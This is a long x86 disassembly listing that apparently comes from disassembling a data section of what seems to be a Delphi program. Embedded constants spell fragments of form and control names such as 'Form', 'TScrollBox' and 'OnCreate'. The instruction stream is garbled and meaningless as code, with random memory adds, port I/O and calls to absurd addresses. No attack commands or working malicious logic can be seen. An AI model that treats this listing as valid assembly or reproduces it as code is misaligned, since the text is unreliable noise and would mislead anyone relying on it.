jb r-xdata
pop es
add [ eax + ebp * 2 + 0x49 ] bh
add [ eax + 0x8004785 ] ah
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax + 0x48004783 ] cl
jge r-xdata
add ah bh
add [ eax + eax + 0x4c ] 0x84
inc esp
inc edx
inc edi
add al bl
jb r-xdata
add [ 0x74726556 ] cl
inc ecx
inc edi
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
add [ eax ] al
adc eax 0x75410a00
je r-xdata
insb
insb
inc edx
outsd
js r-xdata
aam 0x42
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x7d ] ch
inc edi
add [ eax ] bl
add [ edi ] 0x4c
add [ edi ] 0x2
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] al
sub eax 0x85040049
inc edi
add al al
sub [ ecx ] ecx
or [ ebp + 0x47 ] bh
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd4478c1b
jle r-xdata
dec ecx
add [ esi ] bh
dec ecx
add ah ah
into
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x7fffb87c ] bl
outsd
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
jmp 0xffffffff84ab42fc
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ch
inc ecx
inc edi
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
outsb
outsb
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
sbb [ esi + 0x44 ] dl
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax + eax - 0x7a974ff0 ] al
inc edi
add [ ebp + eax * 4 + 0x47 ] dh
add [ edx ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
js r-xdata
inc edi
add [ eax ] bl
inc ecx
inc edi
add [ eax ] dl
add eax 0x6d726f46
jae r-xdata
inc edx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
jno r-xdata
inc edi
add [ eax + 0x7d ] cl
inc edi
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
nop
nop
fadd [ ebx + 0x47 ]
add [ edi ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
jb r-xdata
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] bl
add [ edx ] cl
inc edx
jbe r-xdata
test al 0x8e
dec eax
add [ ecx - 0x3700ffff ] ch
ja r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
cmpsb [ esi ] [ edi ]
add [ eax ] eax
[ eax + 0x1004977 ]
add bh bh
push esp
ja r-xdata
sbb [ esi + 0x44 ] dl
add [ eax + 0x2 ] ch
add bh bh
les edi [ esi + 0x47 ]
jle r-xdata
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
jb r-xdata
je r-xdata
add [ eax + 0x4208001c ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
inc edx
inc edi
add [ eax + 0x2 ] bh
insb
dec edi
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
add [ edx ] bl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
dec ecx
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xbc004481
jl r-xdata
insb
test [ eax + eax - 0x28 ] al
jae r-xdata
nop
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffec000000 ] al
add [ eax ] al
jb r-xdata
add bh bh
push esp
test [ edi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
sbb eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
lodsb [ esi ]
add [ eax ] eax
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ eax ] al
sbb eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
jne r-xdata
add [ eax + 0x440e0020 ] al
outsd
jne r-xdata
add bh bh
or [ ebx + 0x49 ] dl
je r-xdata
pop ss
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax + 0x430b001e ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
insb
sbb al 0x7c
dec eax
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ebx ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add eax 0x336c7443
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
add bh bh
and cl ah
dec eax
add [ ecx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050025 ] al
outsd
insb
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
xor ah 0xff
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44561873
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x18 ] 0x54004456
add al [ eax ]
dec [ eax ]
push ebx
dec ecx
add [ eax + 0x1 ] al
sub [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040027 ] al
outsd
outsb
je r-xdata
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
les edi [ ecx + 0x640046 ]
add bh bh
loopne r-xdata
add [ 0x336c7443 ] al
push esi
inc esp
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050026 ] al
je r-xdata
add [ eax ] 0x0
jpe r-xdata
dec ecx
add [ ecx ] al
outsb
je r-xdata
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
int3
jle r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
sbb [ esi + 0x44 ] dl
xor eax [ esp + eax * 8 - 0x47 ]
inc esi
add [ eax + eax ] ah
jmp [ eax + 0x48 ]
add [ eax ] al
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
dec eax
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
jge r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ ecx + eax + 0x7e00ff00 ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070028 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
add [ eax ] al
[ eax + eax ]
jmp [ eax ]
jb r-xdata
add al cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
loopne r-xdata
outsb
je r-xdata
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61501400
outsb
je r-xdata
push 0x49
add [ ebx + ebp * 2 ] ch
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ cs : edx ] cl
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax + edx * 2 ] dl
popad
outsd
insb
outsd
inc [ edi + ebx * 8 + 0x48 ]
outsb
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
or edx [ eax + 0x61 ]
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
outsb
je r-xdata
pop ds
inc esi
add [ eax + eax ] bh
sbb [ esi + 0x44 ] dl
imul ebp [ esi + 0x74 ] r-xdata
lodsb [ esi ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
xor al 0x0
pop es
jo r-xdata
das
add [ eax + 0x1 ] al
outsd
jne r-xdata
je r-xdata
jne r-xdata
push 0x6948776f
jpe r-xdata
cmp [ eax ] 0x0
jpe r-xdata
add [ esi ] cl
push eax
popad
jb r-xdata
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
loopne r-xdata
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
inc esp
sbb [ fs : esi + 0x44 ] dl
add [ edx ] bl
add bh bh
je r-xdata
add bh bh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
add [ eax ] al
js r-xdata
add [ eax ] al
add bh bh
shl al 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add bh bh
inc esp
imul ecx [ ecx ] 0x1
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
add [ eax ] 0x0
jb r-xdata
add [ eax ] al
sub al [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x20656c62
test [ eax ] ecx
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0b00
inc ebx
popad
outsb
push edx
jae r-xdata
add [ edi ] al
add [ edi ] dl
push esi
inc esp
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080031 ] al
add [ eax + 0x50090030 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
inc edi
je r-xdata
add [ eax + 0x4f0a003b ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add bh bh
[ eax ] eax
or [ eax ] 0xff0000d8
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
dec eax
add al bl
add [ eax ] al
jo r-xdata
inc esp
imul esi [ ebp + 0x49 ] 0x186f666e
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
inc esp
jb r-xdata
push cs
adc al 0x42
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe946499e
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
jae r-xdata
adc al 0x42
add al bh
add [ eax ] eax
jo r-xdata
jb r-xdata
jo r-xdata
add [ eax + 0x4f10004a ] al
dec ebp
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
dec edi
or [ eax ] 0xff0000e0
loopne r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or [ eax ] 0xf8
add [ eax ] al
add al ah
add [ eax ] al
jmp eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ eax ] 0xfffffff0
add [ eax ] eax
push eax
add [ eax ] eax
push ebx
je r-xdata
push edi
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090048 ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
inc esp
jb r-xdata
imul esp eax 0x2b
inc edx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x40 ] bp
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004e ] al
outsb
push ebx
je r-xdata
test al 0x86
dec eax
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e004b ] al
outsd
jne r-xdata
push ebp
jo r-xdata
add [ eax ] al
dec edi
jbe r-xdata
or [ ecx + 0x4f ] cl
add bh bh
call [ eax + 0x474d0890 ]
add [ edi ] cl
add eax 0x6d726f46
jae r-xdata
in al dx
insb
invd
dec ecx
dec edi
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
outsb
push edi
xchg [ eax ] cl
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ edi + ecx * 2 ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jae r-xdata
pushad
push edi
inc esp
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
inc esi
outsd
jb r-xdata
fadd [ bp + di + 0x48 ]
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
outsb
dec ebp
push cs
dec edi
adc al 0x42
add al ch
add [ eax ] al
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
jae r-xdata
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x2c ] bp
dec esp
inc edi
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
outsd
jpe r-xdata
push 0xa86c6565
xchg [ eax ] cl
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ eax ] dl
dec edi
dec esp
popad
jbe r-xdata
inc esi
add [ edi + ecx * 2 ] cl
outsb
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
insb
je r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
call [ eax + 0x4d389090 ]
inc edi
add [ ecx ] dl
push cs
push esp
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] cl
dec eax
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004d ] al
outsb
outsb
dec ebp
outsd
jne r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
outsb
dec ebp
outsd
jne r-xdata
outsd
ja r-xdata
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
test [ eax ] cl
or [ edx ] al
add bh bh
or [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ 0x65476e4f ] cl
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsb
jne r-xdata
nop
inc esi
outsd
jb r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
inc edi
add [ esi ] al
or al 0x54
jns r-xdata
add ecx [ ebx ]
push esp
inc edx
jo r-xdata
push 0x446c6565
outsd
ja r-xdata
outsd
jbe r-xdata
dec ebp
add [ eax ] al
add [ esi + ecx * 2 + 0x64090047 ] dh
insd
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
mov eax 0x300474e
je r-xdata
popad
js r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
insb
jns r-xdata
jae r-xdata
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
push eax
outsd
jb r-xdata
outsd
outsb
inc ecx
jb r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
insb
or [ fs : esi + 0x73 ] esp
dec ebp
nop
add al 0x4e
push cs
jo r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
dec ebp
inc edi
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
mov al 0x4d
jb r-xdata
nop
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc00474d ] dh
outsd
popad
jns r-xdata
nop
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
popad
dec ebp
je r-xdata
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov ah 0x4e
inc edi
add [ ecx ] cl
insd
inc esp
popa
jne r-xdata
push es
add eax 0x6d726f46
jae r-xdata
insd
popad
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jae r-xdata
dec esi
inc edi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] bl
dec esi
inc edi
add [ edx ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
push esp
dec edi
inc edi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
jo r-xdata
push es
outsd
nop
nop
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] cl
dec edi
inc edi
dec edi
inc edi
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
inc edi
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
dec edi
add eax 0x6d726f46
jo r-xdata
jne r-xdata
nop
nop
inc esp
jae r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax + 0x4f ] dl
inc edi
add [ eax + 0x4fe09090 ] dl
inc edi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax ] bl
push esi
inc esp
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x4f ] dl
pushfd
jo r-xdata
dec esi
outsd
outsb
push cs
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
andps xmm0 [ ebp + 0x66 ]
dec esi
inc edi
add [ ebx ] al
push esp
push eax
dec edi
ja r-xdata
mov ah 0x4d
inc edi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
push edi
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
sbb [ esi + 0x44 ] dl
add [ eax ] al
cwde
push esi
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc esi
outsd
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
insb
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] bl
push esi
inc esp
add [ eax + 0x50bc9090 ] dl
inc edi
add [ ebx ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
insb
push esi
inc esp
jbe r-xdata
dec eax
add [ eax + 0x3f ] ch
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ esi ] al
add [ eax ] al
or [ edi + 0x47 ] cl
jae r-xdata
adc [ eax + 0x6f ] esi
insd
outsd
dec eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
inc esi
jb r-xdata
aas
add [ eax ] al
pop esp
push ecx
inc edi
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004750 ] bh
dec eax
popad
outsb
insb
pop es
inc edx
pop es
jo r-xdata
add [ eax ] al
mov eax 0x6004750
outsb
je r-xdata
dec eax
add [ ebx ] cl
push esp
inc edi
insb
aas
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
add [ eax + eax ] dh
add [ eax ] al
aam 0x1c
inc edx
